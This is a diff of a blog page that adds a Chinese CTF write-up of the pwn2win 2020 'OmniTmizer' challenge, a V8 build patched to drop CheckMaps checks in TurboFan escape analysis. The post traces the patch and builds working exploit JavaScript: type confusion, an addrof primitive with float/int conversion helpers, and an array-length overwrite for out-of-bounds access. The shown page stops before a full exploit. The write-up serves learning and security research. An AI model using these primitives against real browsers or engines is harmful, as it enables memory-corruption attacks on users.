@@ -6,15 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | ruan</title>
+  <title>pwn2win CTF OmniTmizer | ruan</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="ruan">
-<meta property="og:url" content="http://yoursite.com/archives/page/4/index.html">
+  <meta name="description" content="最近复现了一些v8的CVE，想找一题v8相关的CTF题目来试一试自己能不能独立的写出exp来，于是想了想就找到了当时瞎几把复现的题目：OmniTmizer，一道与turbofan JIT的escape analysis相关的题目">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn2win CTF OmniTmizer">
+<meta property="og:url" content="http://yoursite.com/2022/01/26/pwn2winctf2020-OmniTmizer_new/index.html">
 <meta property="og:site_name" content="ruan">
+<meta property="og:description" content="最近复现了一些v8的CVE，想找一题v8相关的CTF题目来试一试自己能不能独立的写出exp来，于是想了想就找到了当时瞎几把复现的题目：OmniTmizer，一道与turbofan JIT的escape analysis相关的题目">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/img/OmniTmizer/normal1.png">
+<meta property="og:image" content="http://yoursite.com/img/OmniTmizer/patch1.png">
+<meta property="og:image" content="http://yoursite.com/img/OmniTmizer/bqb1.webp">
+<meta property="og:image" content="http://yoursite.com/img/OmniTmizer/output1.png">
+<meta property="article:published_time" content="2022-01-26T04:21:45.000Z">
+<meta property="article:modified_time" content="2022-01-26T04:26:54.746Z">
 <meta property="article:author" content="ruan">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/img/OmniTmizer/normal1.png">
   
     <link rel="alternative" href="/atom.xml" title="ruan" type="application/atom+xml">
   
@@ -136,295 +145,217 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-pwn2winctf2020-OmniTmizer_new" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      pwn2win CTF OmniTmizer
+    </h1>
+  
+
+        
+        <a href="/2022/01/26/pwn2winctf2020-OmniTmizer_new/" class="archive-article-date">
+  	<time datetime="2022-01-26T04:21:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-26</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>最近复现了一些v8的CVE，想找一题v8相关的CTF题目来试一试自己能不能独立的写出exp来，于是想了想就找到了当时瞎几把复现的题目：OmniTmizer，一道与turbofan JIT的escape analysis相关的题目</p>
+<p><escape><span id="more"></span></escape></p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>先来看看patch：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/v8/v8/tree/50dd84ca317ae35c926ed34d001a72b62aea6662</span></span><br><span class="line">diff --git a/src/compiler/escape-analysis.cc b/src/compiler/escape-analysis.cc</span><br><span class="line">index b3f684ea61..ae2cbdabca <span class="number">100644</span></span><br><span class="line">--- a/src/compiler/escape-analysis.cc</span><br><span class="line">+++ b/src/compiler/escape-analysis.cc</span><br><span class="line">@@ <span class="number">-726</span>,<span class="number">29</span> +<span class="number">726</span>,<span class="number">8</span> @@ <span class="function"><span class="keyword">void</span> <span class="title">ReduceNode</span><span class="params">(<span class="keyword">const</span> Operator* op, EscapeAnalysisTracker::Scope* current,</span></span></span><br><span class="line"><span class="function"><span class="params">       <span class="keyword">break</span>;</span></span></span><br><span class="line"><span class="function"><span class="params">     &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">case</span> IrOpcode::kCheckMaps: &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">-      CheckMapsParameters params = CheckMapsParametersOf(op);</span></span></span><br><span class="line"><span class="function"><span class="params">-      Node* checked = current-&gt;ValueInput(<span class="number">0</span>);</span></span></span><br><span class="line"><span class="function"><span class="params">-      <span class="keyword">const</span> VirtualObject* vobject = current-&gt;GetVirtualObject(checked);</span></span></span><br><span class="line"><span class="function"><span class="params">-      Variable map_field;</span></span></span><br><span class="line"><span class="function"><span class="params">-      Node* map;</span></span></span><br><span class="line"><span class="function"><span class="params">-      <span class="keyword">if</span> (vobject &amp;&amp; !vobject-&gt;HasEscaped() &amp;&amp;</span></span></span><br><span class="line"><span class="function"><span class="params">-          vobject-&gt;FieldAt(HeapObject::kMapOffset).To(&amp;map_field) &amp;&amp;</span></span></span><br><span class="line"><span class="function"><span class="params">-          current-&gt;Get(map_field).To(&amp;map)) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">-        <span class="keyword">if</span> (map) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">-          Type <span class="keyword">const</span> map_type = NodeProperties::GetType(map);</span></span></span><br><span class="line"><span class="function"><span class="params">-          <span class="keyword">if</span> (map_type.IsHeapConstant() &amp;&amp;</span></span></span><br><span class="line"><span class="function"><span class="params">-              params.maps().contains(</span></span></span><br><span class="line"><span class="function"><span class="params">-                  map_type.AsHeapConstant()-&gt;Ref().AsMap().object())) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">-            current-&gt;MarkForDeletion();</span></span></span><br><span class="line"><span class="function"><span class="params">-            <span class="keyword">break</span>;</span></span></span><br><span class="line"><span class="function"><span class="params">-          &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">-        &#125; <span class="keyword">else</span> &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">-          <span class="comment">// If the variable has no value, we have not reached the fixed-point</span></span></span></span><br><span class="line"><span class="function"><span class="params">-          <span class="comment">// yet.</span></span></span></span><br><span class="line"><span class="function"><span class="params">-          <span class="keyword">break</span>;</span></span></span><br><span class="line"><span class="function"><span class="params">-        &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">-      &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">-      current-&gt;SetEscaped(checked);</span></span></span><br><span class="line"><span class="function"><span class="params">+      <span class="comment">//OmniTmizer - Improving performance</span></span></span></span><br><span class="line"><span class="function"><span class="params">+      current-&gt;MarkForDeletion();</span></span></span><br><span class="line"><span class="function"><span class="params">       <span class="keyword">break</span>;</span></span></span><br><span class="line"><span class="function"><span class="params">     &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">case</span> IrOpcode::kCompareMaps: &#123;</span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br></pre></td></tr></table></figure>
+
+<p>patch中给了commit id，先编译一个一样的没打补丁的版本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 50dd84ca317ae35c926ed34d001a72b62aea6662</span><br><span class="line">gclient sync</span><br><span class="line">tools&#x2F;dev&#x2F;v8gen.py  x64.debug</span><br><span class="line">ninja -C out.gn&#x2F;x64.debug d8</span><br></pre></td></tr></table></figure>
+
+<p>可以看到该patch是打在src/compiler/escape-analysis.cc的ReduceNode函数，先找找是谁调用了该函数</p>
+<p>先从src/compiler/pipeline.cc开始找起：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">PipelineImpl::OptimizeGraph</span><span class="params">(Linkage* linkage)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// [..........]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (FLAG_turbo_escape) &#123;</span><br><span class="line">    Run&lt;EscapeAnalysisPhase&gt;();</span><br><span class="line">    <span class="keyword">if</span> (data-&gt;<span class="built_in">compilation_failed</span>()) &#123;</span><br><span class="line">      <span class="built_in">info</span>()-&gt;<span class="built_in">AbortOptimization</span>(</span><br><span class="line">          BailoutReason::kCyclicObjectStateDetectedInEscapeAnalysis);</span><br><span class="line">      data-&gt;<span class="built_in">EndPhaseKind</span>();</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">RunPrintAndVerify</span>(EscapeAnalysisPhase::<span class="built_in">phase_name</span>());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// [.......................]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>Run&lt;EscapeAnalysisPhase&gt;()</code>函数会调用到<code>EscapeAnalysisPhase::Run</code>：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EscapeAnalysisPhase</span> &#123;</span></span><br><span class="line">  <span class="built_in">DECL_PIPELINE_PHASE_CONSTANTS</span>(EscapeAnalysis)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Run</span><span class="params">(PipelineData* data, Zone* temp_zone)</span> </span>&#123;</span><br><span class="line">    <span class="function">EscapeAnalysis <span class="title">escape_analysis</span><span class="params">(data-&gt;jsgraph(),</span></span></span><br><span class="line"><span class="function"><span class="params">                                   &amp;data-&gt;info()-&gt;tick_counter(), temp_zone)</span></span>;</span><br><span class="line">    escape_analysis.<span class="built_in">ReduceGraph</span>();	<span class="comment">// [1]</span></span><br><span class="line">    <span class="function">GraphReducer <span class="title">reducer</span><span class="params">(temp_zone, data-&gt;graph(),</span></span></span><br><span class="line"><span class="function"><span class="params">                         &amp;data-&gt;info()-&gt;tick_counter(),</span></span></span><br><span class="line"><span class="function"><span class="params">                         data-&gt;jsgraph()-&gt;Dead())</span></span>;</span><br><span class="line">    <span class="function">EscapeAnalysisReducer <span class="title">escape_reducer</span><span class="params">(&amp;reducer, data-&gt;jsgraph(),</span></span></span><br><span class="line"><span class="function"><span class="params">                                         escape_analysis.analysis_result(),</span></span></span><br><span class="line"><span class="function"><span class="params">                                         temp_zone)</span></span>;</span><br><span class="line">    <span class="built_in">AddReducer</span>(data, &amp;reducer, &amp;escape_reducer);</span><br><span class="line">    reducer.<span class="built_in">ReduceGraph</span>();</span><br><span class="line">    <span class="comment">// TODO(tebbi): Turn this into a debug mode check once we have confidence.</span></span><br><span class="line">    escape_reducer.<span class="built_in">VerifyReplacement</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p><code>EscapeAnalysisPhase::Run</code>函数会先在[1]处对graph进行一次reduce：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// EscapeAnalysisPhase 继承自EffectGraphReducer，reduce函数使用的是EscapeAnalysis::Reduce（从构造函数中可以得知）</span></span><br><span class="line"><span class="comment">// src/compiler/escape-analysis.cc</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EscapeAnalysis::Reduce</span><span class="params">(Node* node, Reduction* reduction)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> Operator* op = node-&gt;<span class="built_in">op</span>();</span><br><span class="line">  <span class="built_in">TRACE</span>(<span class="string">&quot;Reducing %s#%d\n&quot;</span>, op-&gt;<span class="built_in">mnemonic</span>(), node-&gt;<span class="built_in">id</span>());</span><br><span class="line"></span><br><span class="line">  <span class="function">EscapeAnalysisTracker::Scope <span class="title">current</span><span class="params">(<span class="keyword">this</span>, tracker_, node, reduction)</span></span>;</span><br><span class="line">  <span class="built_in">ReduceNode</span>(op, &amp;current, <span class="built_in">jsgraph</span>());	<span class="comment">// [2]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>[2]处的ReduceNode就是被打patch的函数</p>
+<h3 id="初次尝试"><a href="#初次尝试" class="headerlink" title="初次尝试"></a>初次尝试</h3><p>为了查看被打patch的函数对kCheckMaps的行为，一开始写了个如下的测试代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> zoo = &#123;<span class="attr">x</span>:<span class="number">3</span>&#125;;</span><br><span class="line">    <span class="keyword">return</span> a.x + zoo.x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bar = &#123;</span><br><span class="line">    x : <span class="number">1</span>,</span><br><span class="line">    y : <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; <span class="number">10000</span>;i++)</span><br><span class="line">    foo(bar);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(foo(bar));</span><br></pre></td></tr></table></figure>
+
+<p>查看生成的graph：</p>
+<p><img src="/img/OmniTmizer/normal1.png"></p>
+<p>在和打了patch的版本进行对比：</p>
+<p><img src="/img/OmniTmizer/patch1.png"></p>
+<p>可以看到打了patch的版本的CheckMaps节点被删除了，回到打了patch之后的代码：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">case</span> IrOpcode::kCheckMaps: &#123;</span><br><span class="line">       <span class="comment">//OmniTmizer - Improving performance</span></span><br><span class="line">       current-&gt;<span class="built_in">MarkForDeletion</span>();</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MarkForDeletion</span><span class="params">()</span> </span>&#123; <span class="built_in">SetReplacement</span>(tracker_-&gt;jsgraph_-&gt;<span class="built_in">Dead</span>()); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetReplacement</span><span class="params">(Node* replacement)</span> </span>&#123;</span><br><span class="line">      replacement_ = replacement;</span><br><span class="line">      vobject_ =</span><br><span class="line">          replacement ? tracker_-&gt;virtual_objects_.<span class="built_in">Get</span>(replacement) : <span class="literal">nullptr</span>;</span><br><span class="line">      <span class="keyword">if</span> (replacement) &#123;</span><br><span class="line">        <span class="built_in">TRACE</span>(<span class="string">&quot;Set %s#%d as replacement.\n&quot;</span>, replacement-&gt;<span class="built_in">op</span>()-&gt;<span class="built_in">mnemonic</span>(),</span><br><span class="line">              replacement-&gt;<span class="built_in">id</span>());</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">TRACE</span>(<span class="string">&quot;Set nullptr as replacement.\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;   </span><br></pre></td></tr></table></figure>
+
+<p>markForDeletion会把当前节点替换成Dead节点，在这里是等同于把CheckMaps节点删除了</p>
+<p>CheckMaps节点一般是用来保证对象的Map不会发生变化，如果发生变化了就进行deopt，这里在EscapeAnalysis阶段把CheckMaps给删除了，那是不是说我们可能可以类型混淆了</p>
+<p><img src="/img/OmniTmizer/bqb1.webp"></p>
+<p>一开始我试了个这个：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> x = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> y = <span class="number">1.1</span>;</span><br><span class="line">    x += <span class="number">1</span>;</span><br><span class="line">    y += <span class="number">2.2</span>;</span><br><span class="line">    <span class="keyword">return</span> a.x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bar = &#123;</span><br><span class="line">    x : <span class="number">1</span>,</span><br><span class="line">    y : <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> zoo = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; <span class="number">60000</span>;i++)</span><br><span class="line">    foo(bar);</span><br><span class="line"><span class="built_in">console</span>.log(foo(zoo));</span><br></pre></td></tr></table></figure>
+
+<p>运行了下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS D:\shared\pwn2win_2020\pwn-OmniTmizer\files\x64.release&gt; .\d8.exe  .\test.js</span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure>
+
+<p>我猜是zoo的length，因为从上面的LoadField[+12]，而Array对象的+12处偏移（开启了指针压缩）正是length，也就是4</p>
+<p>再改改zoo的长度，看看输出：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// var zoo = [1.1,2.2,3.3,4.4,5.5];</span></span><br><span class="line"></span><br><span class="line">PS D:\shared\pwn2win_2020\pwn-OmniTmizer\files\x64.release&gt; .\d8.exe  .\test.js</span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure>
+
+<p>猜测正确</p>
+<h3 id="addrof"><a href="#addrof" class="headerlink" title="addrof"></a>addrof</h3><p>那我们可以直接根据上面的代码改一改，构造一个addrof原语：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> x = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> y = <span class="number">1.1</span>;</span><br><span class="line">    x += <span class="number">1</span>;</span><br><span class="line">    y += <span class="number">2.2</span>;</span><br><span class="line">    <span class="keyword">return</span> a[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> zoo = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>];</span><br><span class="line"><span class="keyword">var</span> bar = [zoo,zoo,zoo,zoo];</span><br><span class="line"></span><br><span class="line">%DebugPrint(zoo);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; <span class="number">60000</span>;i++)</span><br><span class="line">    foo(zoo);</span><br><span class="line"><span class="built_in">console</span>.log(foo(bar));</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS D:\shared\pwn2win_2020\pwn-OmniTmizer\files\x64.release&gt; .\d8.exe  --allow-natives-syntax .\test.js</span><br><span class="line">DebugPrint: <span class="number">0000033</span>A080855D5: [JSArray]</span><br><span class="line"><span class="comment">// [.......................................]</span></span><br><span class="line"><span class="number">5.757981678926115e-270</span></span><br></pre></td></tr></table></figure>
+
+<p>转换一下最后的输出：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="built_in">hex</span>(struct.<span class="built_in">unpack</span>(<span class="string">&quot;&lt;q&quot;</span>,struct.<span class="built_in">pack</span>(<span class="string">&quot;&lt;d&quot;</span>,<span class="number">5.757981678926115e-270</span>))[<span class="number">0</span>])</span><br><span class="line">&#x27;0x80855d5080855d5&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到我们成功的把zoo的地址泄露了出来，嘿嘿</p>
+<p>封装一下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> format_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(format_buffer);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(format_buffer);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + value.toString(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> zoo = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>];</span><br><span class="line"><span class="keyword">var</span> bar = [zoo,zoo,zoo,zoo];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> x = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> y = <span class="number">1.1</span>;</span><br><span class="line">    x += <span class="number">1</span>;</span><br><span class="line">    y += <span class="number">2.2</span>;</span><br><span class="line">    <span class="keyword">return</span> a[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; <span class="number">60000</span>;i++)</span><br><span class="line">    foo(zoo);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    bar[<span class="number">0</span>] = obj;</span><br><span class="line">    <span class="keyword">let</span> addr = f2i(foo(bar));</span><br><span class="line">    <span class="keyword">return</span> addr &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> test_obj = &#123;<span class="attr">x</span>:<span class="number">1</span>,<span class="attr">y</span>:<span class="number">2</span>&#125;;</span><br><span class="line">%DebugPrint(test_obj);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(hex(addrof(test_obj)));</span><br></pre></td></tr></table></figure>
+
+<p>想要伪造一个对象，我们需要泄露出相对应对象的map，但是前面的addrof只能泄露变量的地址，做不到泄露出对象的map</p>
+<p>这里卡住了，，，</p>
+<p>思来想去，想到一开始我们不是把Array.length当作a.x返回了，那我直接写它是不是等于把Array.length直接给改了，带着这个思路：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> x = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> y = <span class="number">1.1</span>;</span><br><span class="line">    x += <span class="number">1</span>;</span><br><span class="line">    y += <span class="number">2.2</span>;</span><br><span class="line">    a.x = <span class="number">30</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bar = &#123;</span><br><span class="line">    x : <span class="number">1</span>,</span><br><span class="line">    y : <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> zoo = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"><span class="keyword">var</span> leakme = [<span class="number">6.6</span>,<span class="number">7.7</span>,<span class="number">8.8</span>,<span class="number">9.9</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; <span class="number">60000</span>;i++)</span><br><span class="line">    foo(bar);</span><br><span class="line">foo(zoo);</span><br><span class="line"><span class="built_in">console</span>.log(zoo.length);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; zoo.length;i++)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(zoo[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
